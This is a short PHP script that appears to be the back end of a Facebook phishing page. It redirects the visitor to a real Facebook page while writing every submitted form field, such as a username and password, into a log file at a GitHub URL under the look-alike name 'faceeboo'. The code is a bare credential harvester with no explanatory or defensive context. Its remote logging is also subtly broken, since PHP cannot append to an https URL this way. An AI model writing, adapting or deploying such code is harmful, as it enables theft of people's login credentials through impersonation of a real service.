<?php
header ("Location: https://m.facebook.com/fun.posts.photos");
$handle = fopen("https://github.com/faceeboo/faceeboo.github.io/log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
